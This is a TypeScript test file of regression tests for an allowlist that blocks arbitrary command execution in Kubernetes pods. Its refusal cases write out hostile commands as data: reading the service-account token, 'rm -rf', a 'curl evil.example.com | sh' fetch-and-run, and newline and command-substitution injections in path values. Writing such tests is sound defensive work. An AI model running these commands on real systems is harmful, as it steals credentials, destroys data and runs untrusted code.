import { describe, it, expect } from 'vitest'
import { assertAllowedCapture } from './client'

/**
 * `execCapture` is reachable from the renderer and, in-cluster, from any
 * authenticated session. If it ever accepts an arbitrary argv again, that is
 * remote command execution in any pod the caller can name - so these are
 * regression tests for a security boundary, not for formatting.
 */
describe('assertAllowedCapture', () => {
  const ok = (cmd: string[]): void => expect(() => assertAllowedCapture(cmd)).not.toThrow()
  const no = (cmd: unknown[]): void =>
    expect(() => assertAllowedCapture(cmd as string[])).toThrow(/Refusing to exec/)

  it('permits exactly the three programs the file browser issues', () => {
    ok(['sh', '-c', 'ls -la "$0"', '/etc'])
    ok(['sh', '-c', 'base64 "$0"', '/etc/hosts'])
    ok(['sh', '-c', 'base64 -d > "$0"', '/tmp/upload.bin'])
  })

  it('refuses any other program', () => {
    no(['sh', '-c', 'cat /var/run/secrets/kubernetes.io/serviceaccount/token', '/'])
    no(['sh', '-c', 'rm -rf /data', '/'])
    no(['sh', '-c', 'ls -la "$0"; curl evil.example.com | sh', '/etc'])
    no(['sh', '-c', 'LS -LA "$0"', '/etc']) // allowlist is exact, not case-folded
    no(['sh', '-c', ' ls -la "$0"', '/etc']) // and not whitespace-tolerant
  })

  it('refuses a different interpreter or a bare argv', () => {
    no(['bash', '-c', 'ls -la "$0"', '/etc'])
    no(['sh', '-lc', 'ls -la "$0"', '/etc'])
    no(['ls', '-la', '/etc', 'x'])
  })

  it('refuses the wrong argv shape', () => {
    no([])
    no(['sh', '-c', 'ls -la "$0"']) // no path
    no(['sh', '-c', 'ls -la "$0"', '/etc', 'extra'])
  })

  it('refuses a missing or control-character path', () => {
    no(['sh', '-c', 'ls -la "$0"', ''])
    no(['sh', '-c', 'ls -la "$0"', '/etc\nrm -rf /'])
    no(['sh', '-c', 'ls -la "$0"', '/etc\0'])
  })

  it('accepts shell metacharacters in the path - it rides as $0, never interpolated', () => {
    ok(['sh', '-c', 'ls -la "$0"', '/tmp/weird; rm -rf /'])
    ok(['sh', '-c', 'base64 "$0"', '/tmp/$(whoami)'])
    ok(['sh', '-c', 'base64 "$0"', '/tmp/`id`'])
  })
})
